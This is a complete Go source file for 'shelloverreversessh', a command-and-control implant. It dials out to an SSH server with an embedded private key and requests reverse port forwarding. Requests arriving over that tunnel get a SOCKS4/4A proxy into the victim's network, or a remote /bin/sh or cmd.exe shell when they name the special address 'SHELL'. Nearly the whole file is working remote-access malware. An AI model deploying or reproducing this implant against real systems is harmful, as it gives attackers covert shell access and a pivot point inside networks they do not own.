// Program shelloverreversessh is a little implant which SSH's back.
package main

/*
 * shelloverreversessh.go
 * Implant which SSH's back
 * By J. Stuart McMurray
 * Created 20220201
 * Last Modified 20220201
 */

import (
	"crypto/ed25519"
	"crypto/subtle"
	_ "embed"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"

	"golang.org/x/crypto/ssh"
)

/* shellAddr is the pseudoaddress SOCKS clients can use to request a shell. */
const shellAddr = "SHELL"

var (
	//go:embed key
	key    string         /* Implant private key. */
	addr   string         /* Server address. */
	hostfp string         /* Host fingerprint. */
	user   string = "h4x" /* SSH username. */
	port   string         /* SOCKS listen port. */
)

func main() {
	flag.StringVar(
		&key,
		"key",
		key,
		"SSH private key, `base64`-encoded",
	)
	flag.StringVar(
		&addr,
		"addr",
		addr,
		"Server `address`",
	)
	flag.StringVar(
		&user,
		"user",
		user,
		"SSH `username`",
	)
	flag.StringVar(
		&hostfp,
		"fingerprint",
		hostfp,
		"Server host fingerprint",
	)
	flag.StringVar(
		&port,
		"port",
		port,
		"SOCKS listen `port`",
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options]

Connects back to an OpenSSH server, requests a port be forwarded from the
server to the implant (i.e. -R), and accepts SOCKS4A requests.  If a forwarded
connection is to be made via the SOCKS listener to the special address
%s, instead of a TCP connection, a shell (sh/cmd) is hooked up.

Options:
`,
			os.Args[0],
			shellAddr,
		)
		flag.PrintDefaults()
	}
	flag.Parse()

	/* Work out what listen port to ask for. */
	var rport uint32
	if "" == port { /* Randomish port based off of PID */
		rport = 0xF000 + uint32(os.Getpid()%0x0FFF)
	} else { /* User-requested port. */
		pn, err := net.LookupPort("tcp", port)
		if nil != err {
			log.Fatalf("Unable to resolve port %q: %s", port, err)
		}
		if 0xFFFF < pn {
			log.Fatalf("Port %d (%s) too big", pn, port)
		}
		rport = uint32(pn)
	}

	/* Connect to the C2 server. */
	signer, err := parseKey()
	if nil != err {
		log.Fatalf("Parsing key %q: %s", key, err)
	}
	sc, err := ssh.Dial("tcp", addr, &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{ssh.PublicKeys(signer)},
		HostKeyCallback: func(
			h string,
			r net.Addr,
			key ssh.PublicKey,
		) error {
			/* If we're trusting anything, ok... */
			if "" == hostfp {
				return nil
			}
			/* Make sure it matches. */
			if 1 != subtle.ConstantTimeCompare(
				[]byte(hostfp),
				[]byte(ssh.FingerprintSHA256(key)),
			) {
				return errors.New("invalid fingerprint")
			}
			return nil
		},
	})
	if nil != err {
		log.Fatalf("Connecting to server: %s", err)
	}
	log.Printf("Connected to %s", sc.RemoteAddr())

	/* Register handler for forwarded connections. */
	chans := sc.HandleChannelOpen("forwarded-tcpip")
	go handleChans(chans)

	/* Request connections proxied to us. */
	rm := ssh.Marshal(struct {
		bind string
		port uint32
	}{
		bind: "localhost",
		port: rport,
	})
	ok, _, err := sc.SendRequest("tcpip-forward", true, rm)
	if nil != err {
		log.Fatalf("Error requesting forwarded port: %s", err)
	}
	if !ok {
		log.Fatalf("Port forwarding request denied")
	}
	log.Printf("Requested port %d", rport)

	/* Wait for the connection to die. */
	if err := sc.Wait(); nil != err {
		log.Fatalf("SSH connection ended with error: %s", err)
	}
	log.Printf("Disconnected.")
}

/* parseKey parses the key in key and turns it into an ssh.Signer. */
func parseKey() (ssh.Signer, error) {
	/* Unmarshal key. */
	b, err := base64.RawStdEncoding.DecodeString(key)
	if nil != err {
		return nil, fmt.Errorf("decoding key: %w", err)
	}
	if len(b) != ed25519.PrivateKeySize {
		return nil, fmt.Errorf(
			"keys should be %d bytes, got %d",
			ed25519.PrivateKeySize,
			len(b),
		)
	}
	k := ed25519.PrivateKey(b)
	/* SSHify it. */
	return ssh.NewSignerFromSigner(k)
}

/* handleChans handles SOCKS requests. */
func handleChans(chans <-chan ssh.NewChannel) {
	n := 0
	for nc := range chans {
		go handleChan(fmt.Sprintf("ch-%d", n), nc)
		n++
	}
}

/* handleChan handles a SOCKS request. */
func handleChan(tag string, nc ssh.NewChannel) {
	/* Make sure it's a forwarded request.  If it's not, the library is
	broken. */
	if "forwarded-tcpip" != nc.ChannelType() {
		log.Printf(
			"[%s] Unexpected channel type %s",
			tag,
			nc.ChannelType(),
		)
		return
	}

	/* We don't really care who's connecting or to where.  We'll get that
	from the SOCKS part of the request. */
	ch, reqs, err := nc.Accept()
	if nil != err {
		log.Printf("[%s] Error accepting channel: %s", tag, err)
		return
	}
	go ssh.DiscardRequests(reqs)
	defer ch.Close()

	/* Get the port and whether we've got a 4 or 4a request. */
	var sr struct {
		Ver  byte
		Cmd  byte
		Port uint16
		IP   uint32
	}
	if err := binary.Read(ch, binary.BigEndian, &sr); nil != err {
		log.Printf("[%s] Error reading SOCKS4 request: %s", tag, err)
		return
	}
	/* Make sure this is SOCKS4 or 4A. */
	if 0x04 != sr.Ver {
		log.Printf("[%s] Unsupported SOCKS version %d", tag, sr.Ver)
		return
	}
	if 0x01 != sr.Cmd {
		log.Printf("[%s] Unexpected SOCKS command %d", tag, sr.Cmd)
		return
	}

	/* Don't care about the ID */
	if _, err := readString(ch); nil != err {
		log.Printf("[%s] Error reading SOCKS4 ID: %s", tag, err)
		return
	}
	/* Work out where we'll connect. */
	var caddr string
	if 0 == sr.IP&0xFFFFFF00 && 0 != sr.IP&0xFF { /* SOCKS4a */
		/* Next NUL-terminated string is the connect address. */
		caddr, err = readString(ch)
		if nil != err {
			log.Printf(
				"[%s] Error reading connect address: %s",
				tag,
				err,
			)
		}
	} else { /* SOCKS4 */
		/* Connect address is just an IP address. */
		var a [4]byte
		binary.BigEndian.PutUint32(a[:], sr.IP)
		caddr = net.IP(a[:]).String()
	}

	/* If we're connecting a shell, do that. */
	if shellAddr == caddr {
		doShell(tag, ch)
		return
	}

	/* Try to connect upstream. */
	caddr = net.JoinHostPort(caddr, fmt.Sprintf("%d", sr.Port))
	ta, err := net.ResolveTCPAddr("tcp", caddr)
	if nil != err {
		log.Printf("[%s] Unable to resolve %s: %s", tag, caddr, err)
		return
	}
	u, err := net.DialTCP("tcp", nil, ta)
	if nil != err {
		log.Printf(
			"[%s] Failed to connect to %s: %s",
			tag,
			ta,
			err,
		)
		if _, werr := fmt.Fprintf(ch, "\x00\x5bAAAAAA"); nil != werr {
			log.Fatalf(
				"[%s] Error notifying client of failure: %s",
				tag,
				werr,
			)
		}
		return
	}
	tag = tag + "-" + caddr
	log.Printf("[%s] Connected", tag)

	/* Tell the client we're good. */
	if _, werr := fmt.Fprintf(ch, "\x00\x5aAAAAAA"); nil != werr {
		log.Fatalf(
			"[%s] Error notifying client of connection: %s",
			tag,
			werr,
		)
	}

	/* Proxy comms. */
	var wg sync.WaitGroup
	wg.Add(2)
	var fwd, rev int64
	go func() {
		defer wg.Done()
		defer u.CloseWrite()
		var err error
		fwd, err = io.Copy(u, ch)
		if nil != err {
			log.Printf(
				"[%s] Error proxying (forward) after %d bytes: "+
					"%s",
				tag,
				fwd,
				err,
			)
		}
		log.Printf(
			"[%s] Finished proxying (forward) after %d bytes",
			tag,
			fwd,
		)
	}()
	go func() {
		defer wg.Done()
		defer ch.CloseWrite()
		defer u.CloseRead()
		var err error
		rev, err = io.Copy(ch, u)
		if nil != err {
			log.Printf(
				"[%s] Error proxying (reverse) after %d "+
					"bytes: %s",
				tag,
				rev,
				err,
			)
			return
		}
		log.Printf(
			"[%s] Finished proxying (reverse) after %d bytes",
			tag,
			rev,
		)
	}()

	/* All done, tell the user. */
	wg.Wait()
	log.Printf(
		"[%s] Finished after %d bytes: %d forward, %d reverse",
		tag,
		fwd+rev,
		fwd,
		rev,
	)
}

/* doShell hooks up the connection to a shell. */
func doShell(tag string, ch ssh.Channel) {
	tag += "-shell"

	/* Tell the client we're good. */
	if _, werr := fmt.Fprintf(ch, "\x00\x5aAAAAAA"); nil != werr {
		log.Fatalf(
			"[%s] Error notifying client shell will start: %s",
			tag,
			werr,
		)
	}

	/* Roll a shell to start. */
	var shell *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		shell = exec.Command("cmd.exe")
	default:
		shell = exec.Command("/bin/sh")
	}
	shell.Stdin = ch
	shell.Stdout = ch
	shell.Stderr = ch
	/* Start shell going. */
	if _, err := fmt.Fprintf(ch, "Your shell awaits...\n"); nil != err {
		log.Printf("[%s] Greeting shell user: %s", tag, err)
		return
	}
	if err := shell.Start(); nil != err {
		log.Printf("[%s] Error starting shell: %s", tag, err)
		fmt.Fprintf(ch, "Error: %s", err)
		return
	}
	log.Printf("[%s] Shell started", tag)
	/* Wait for it to finish. */
	if err := shell.Wait(); nil != err {
		log.Printf("[%s] Error running shell: %s", tag, err)
		fmt.Fprintf(ch, "Error: %s", err)
		return
	}
	log.Printf("[%s] Shell finished", tag)
}

/* readString gets a NUL-terminated string from r.  The NUL is read but not
part of the returned string. */
func readString(r io.Reader) (string, error) {
	var (
		b  = make([]byte, 1)
		sb strings.Builder
	)
	for {
		/* Get the next byte. */
		n, err := r.Read(b)
		/* 0-byte reads are weird, but can happen. */
		if 1 == n {
			/* NUL-termination. */
			if 0 == b[0] {
				break
			}
			sb.WriteByte(b[0])
		}
		/* If the channel's closed, give up. */
		if nil != err {
			return "", err
		}
	}
	return sb.String(), nil
}
